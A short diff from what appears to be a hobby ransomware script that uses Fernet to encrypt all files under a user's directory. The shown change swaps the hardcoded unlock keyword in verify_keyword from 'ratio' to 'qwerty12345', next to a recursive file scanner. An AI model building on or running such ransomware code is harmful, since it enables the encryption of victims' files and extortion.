@@ -45,7 +45,7 @@ def scanRecurse(baseDir):
             yield from scanRecurse(entry.path)
 
 def verify_keyword(keyword):
-    return keyword == "ratio"
+    return keyword == "qwerty12345"
 
 # Encrypt all files in the current directory and its subdirectories
 directory = "C:/Users/Admin/Desktop/python/Ransomware/fernet"  # Change this to the directory containing the files to be encrypted
